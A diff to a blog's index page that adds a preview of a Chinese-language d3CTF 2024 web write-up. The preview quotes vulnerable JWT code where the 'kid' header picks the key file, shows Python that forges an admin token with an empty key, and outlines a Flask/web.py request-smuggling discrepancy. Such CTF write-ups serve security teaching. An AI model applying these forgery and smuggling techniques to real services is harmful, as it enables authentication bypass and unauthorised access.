@@ -152,6 +152,21 @@
 
 <article class="post-entry"> 
   <header class="entry-header">
+    <h2 class="entry-hint-parent">d3ctf-2024-web-wp
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>d3pythonhttp 解决，一血
+jwt绕过 def get_key(kid): key = &#34;&#34; dir = &#34;/app/&#34; try: with open(dir&#43;kid, &#34;r&#34;) as f: key = f.read() except: pass print(key) return key def verify_token(token): header = jwt.get_unverified_header(token) kid = header[&#34;kid&#34;] key = get_key(kid) try: payload = jwt.decode(token, key, algorithms=[&#34;HS256&#34;]) return True except: return False 验证jwt时kid控制密钥文件路径，如果设置的密钥文件不存在，则key为空，所以构造空秘钥以及一个不存在的文件即可：
+print(jwt.encode({&#34;username&#34;:&#34;admin&#34;,&#34;isadmin&#34;:true}, key, algorithm=&#34;HS256&#34;, headers={&#34;kid&#34;: &#34;frontend_keyasdasd&#34;})) # eyJhbGciOiJIUzI1NiIsImtpZCI6ImZyb250ZW5kX2tleWFzZGFzZCIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNhZG1pbiI6dHJ1ZX0.LmTEt2GD0-nVv-yvf7Dc0lNAlQqBj9FYBb932_UWO6M 解析差异 一种做法是TE-CL请求走私。不过我用的是另一种办法：前端使用Flask，后端使用web.py存在解析差异。 经测试发现：前段对于chunked不分大小写，后端会区分。前端只进行分块传输，忽略Content-Length。而后端会先分块，再根据Content-Length截取，前端会把Content-Length直接发送给后端。
+headers = {key: value for (key, value) in request.headers if key != &#39;Host&#39;} 除了Host以外的header都发往后端了包括Content-Length，且前端不进行计算验证。 数据包：...</p>
+  </div>
+  <footer class="entry-footer"><span title='2024-04-28 20:35:50 +0000 UTC'>April 28, 2024</span>&nbsp;·&nbsp;6 min</footer>
+  <a class="entry-link" aria-label="post link to d3ctf-2024-web-wp" href="https://zoiltin.github.io/posts/d3ctf-2024-web-wp/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
     <h2 class="entry-hint-parent">bi0s CTF 2024 wp
     </h2>
   </header>
